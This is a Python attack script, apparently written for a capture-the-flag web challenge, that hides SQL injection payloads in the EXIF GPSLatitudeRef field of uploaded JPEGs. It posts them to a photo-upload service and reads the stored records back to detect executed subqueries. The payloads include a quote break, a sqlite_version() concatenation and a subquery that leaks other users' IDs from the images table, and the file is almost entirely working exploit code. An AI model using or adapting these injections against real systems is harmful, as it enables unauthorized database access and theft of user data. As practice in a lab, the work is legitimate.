# gps_ref_attack.py — GPSLatitudeRef is READ by the server (it flips latitude sign: S->neg).
# It's a STRING the server processes. If it builds the query/logic with Ref unsanitized, inject here.
# We saw payload in Ref -> latitude stayed POSITIVE (Ref not recognized as 'S'). Now test if a
# quote in Ref breaks SQL (500) and if a subquery lands.
from PIL import Image
import piexif, base64, requests, re

BASE = "https://chl-f4e46c02-efed-4276-8edf-ffade8aa3cf6-mis-viajes-v2.softwareseguro.com.ar"
UID  = "ea42cd39-001b-4fb5-a509-449322674687"
base_img = Image.open("paisaje.png").convert("RGB")
UURE  = re.compile(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}")
verre = re.compile(r"3\.\d+\.\d+")

def send(latref, desc, lonref=b"W"):
    base_img.save("gr.jpg","jpeg",quality=85)
    def dms(x):
        dd=int(x); m=int((x-dd)*60); s=round((x-dd-m/60)*3600,4); return ((dd,1),(m,1),(int(s*100),100))
    gps={piexif.GPSIFD.GPSLatitudeRef:latref, piexif.GPSIFD.GPSLatitude:dms(41.13),
         piexif.GPSIFD.GPSLongitudeRef:lonref, piexif.GPSIFD.GPSLongitude:dms(71.31)}
    ex={'0th':{piexif.ImageIFD.Make:b'Samsung',piexif.ImageIFD.Model:b'Galaxy S25'},
        'Exif':{piexif.ExifIFD.DateTimeOriginal:b'2025:10:01 23:51:37'}, 'GPS':gps}
    piexif.insert(piexif.dump(ex),"gr.jpg")
    uri="data:image/jpeg;base64,"+base64.b64encode(open("gr.jpg","rb").read()).decode()
    r=requests.post(f"{BASE}/upload", json={"image":uri,"description":desc,"user_id":UID})
    return r.status_code

q = b"'"
tests = [
    ("ref_S",       b"S"),                                             # control: lat should be -41.13
    ("ref_quote",   b"S'"),                                            # quote -> 500 if concatenated
    ("ref_concat",  b"S'||(SELECT sqlite_version())||'"),
    ("ref_leak",    b"S'||(SELECT user_id FROM images WHERE id=1)||'"),
    ("ref_num",     b"S,(SELECT sqlite_version()))--"),
]
for desc, ref in tests:
    sc = send(ref, "GR_"+desc)
    print(f"{desc:12} ref={ref!r:45} -> {sc}")

print("\n--- readback ---")
data = requests.get(f"{BASE}/images/{UID}").json()
for img in data:
    d = img.get("description","")
    if d.startswith("GR_"):
        flds={k:img.get(k) for k in ("latitude","longitude","make","datetime","summary_ocr")}
        hit = any(verre.search(str(v)) for v in flds.values())
        leak= [u for v in flds.values() for u in UURE.findall(str(v)) if u!=UID]
        print(f"{d:14} {flds}" + ("  <<< EXEC" if hit else "") + (f"  <<< UUID {leak}" if leak else ""))
